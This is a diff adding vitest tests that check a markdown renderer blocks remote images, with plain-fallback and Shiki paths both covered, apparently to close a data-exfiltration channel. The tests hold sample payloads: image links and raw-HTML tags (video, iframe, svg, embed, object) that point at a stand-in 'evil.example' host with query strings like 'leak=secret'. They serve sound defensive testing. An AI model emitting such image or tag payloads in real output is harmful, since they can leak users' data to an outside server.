@@ -1,5 +1,6 @@
 import { describe, expect, it, vi } from 'vitest'
-import { createMarkdownProcessor, extractFenceLanguages, renderWithPlainFallback } from '~/lib/markdownProcessor'
+import { createMarkdownProcessor, extractFenceLanguages, plainMarkdownProcessor, renderWithPlainFallback } from '~/lib/markdownProcessor'
+import { BLOCKED_IMAGE_CHIP_TEXT } from '~/lib/rehypeBlockRemoteImages'
 import { createLazyOnigurumaHighlighter } from '~/lib/shikiLazyHighlighter'
 import { collectShikiStyles } from '~/lib/shikiStyleClass'
 
@@ -178,5 +179,98 @@ describe('createMarkdownProcessor with the lazy Oniguruma highlighter', () => {
     finally {
       warn.mockRestore()
     }
+  })
+})
+
+describe('remote-image blocking in both processors', () => {
+  // Every processor exported here must block remote images: the Shiki one feeds the
+  // worker + the sync main-thread render, the plain one feeds the streaming placeholder
+  // and the Shiki-failure fallback. Blocking in one but not the other would leave the
+  // exfil vector open on whichever path happened to render the message.
+  async function processors(): Promise<[string, (md: string) => string][]> {
+    const hl = createLazyOnigurumaHighlighter()
+    const highlighter = await hl.ensureReady()
+    const shiki = createMarkdownProcessor(highlighter)
+    return [
+      ['createMarkdownProcessor', (md: string) => String(shiki.processSync(md))],
+      ['plainMarkdownProcessor', (md: string) => String(plainMarkdownProcessor.processSync(md))],
+    ]
+  }
+
+  it('replaces a remote image with the placeholder (never an <img src="https://...">)', async () => {
+    for (const [name, render] of await processors()) {
+      const html = render('![diagram](https://evil.example/x.png?leak=secret)')
+      expect(html, name).not.toContain('<img')
+      expect(html, name).not.toContain('src=')
+      expect(html, name).toContain(BLOCKED_IMAGE_CHIP_TEXT)
+      // The alt text (the author's own description) is the fallback and must survive.
+      expect(html, name).toContain('>diagram<')
+      // ...and the URL is reachable only through a deliberate click, hardened by the
+      // sibling link pass rather than a second URL policy.
+      expect(html, name).toContain('href="https://evil.example/x.png?leak=secret"')
+      expect(html, name).toContain('rel="noopener noreferrer nofollow"')
+    }
+  })
+
+  it('blocks a protocol-relative src, and does not leave it clickable', async () => {
+    for (const [name, render] of await processors()) {
+      const html = render('![shot](//evil.example/x.png)')
+      expect(html, name).not.toContain('<img')
+      expect(html, name).toContain(BLOCKED_IMAGE_CHIP_TEXT)
+      expect(html, name).toContain('shot')
+      // rehypeExternalLinks unwraps the non-http(s) href, so the label is plain text.
+      expect(html, name).not.toContain('href="//evil.example/x.png"')
+    }
+  })
+
+  it('passes data: and blob: images through untouched', async () => {
+    for (const [name, render] of await processors()) {
+      const data = render('![shot](data:image/png;base64,iVBORw0KGgo=)')
+      expect(data, name).toContain('<img src="data:image/png;base64,iVBORw0KGgo=" alt="shot">')
+      expect(data, name).not.toContain(BLOCKED_IMAGE_CHIP_TEXT)
+
+      const blob = render('![shot](blob:http://localhost:3000/9a1f-uuid)')
+      expect(blob, name).toContain('<img src="blob:http://localhost:3000/9a1f-uuid" alt="shot">')
+      expect(blob, name).not.toContain(BLOCKED_IMAGE_CHIP_TEXT)
+    }
+  })
+
+  // The img-only enumeration in rehypeBlockRemoteImages is airtight ONLY because
+  // the pipeline never turns raw HTML into elements (remarkRehype runs without
+  // allowDangerousHtml and rehype-raw is not in the pipeline): <video>, <source>,
+  // <iframe>, srcset and SVG <image> would all fetch without ever hitting the img
+  // branch. This pins that load-bearing invariant -- if raw-HTML rendering is ever
+  // enabled, this fails and forces the block to grow into a property-keyed
+  // allowlist across every URL-bearing element instead of silently reopening the
+  // exfiltration vector.
+  it('never renders raw HTML into elements (the invariant the img-only block rests on)', async () => {
+    const vectors = [
+      '<img src="https://evil.example/raw.png">',
+      '<video src="https://evil.example/v.mp4" autoplay></video>',
+      '<picture><source srcset="https://evil.example/s.png"></picture>',
+      '<audio src="https://evil.example/a.mp3"></audio>',
+      '<iframe src="https://evil.example/f"></iframe>',
+      '<svg><image href="https://evil.example/svg.png"/></svg>',
+      '<embed src="https://evil.example/e">',
+      '<object data="https://evil.example/o"></object>',
+      '<input type="image" src="https://evil.example/i.png">',
+    ]
+    for (const [name, render] of await processors()) {
+      for (const vector of vectors) {
+        expect(render(vector), `${name}: ${vector}`).not.toContain('evil.example')
+      }
+    }
+  })
+
+  it('blocks remote images on the renderWithPlainFallback path when Shiki throws', () => {
+    // The fallback render must not become a hole in the policy.
+    const throwing = {
+      processSync: () => {
+        throw new Error('shiki regex boom')
+      },
+    } as unknown as Processor
+    const html = renderWithPlainFallback(throwing, '![diagram](https://evil.example/x.png)')
+    expect(html).not.toContain('<img')
+    expect(html).toContain(BLOCKED_IMAGE_CHIP_TEXT)
   })
 })
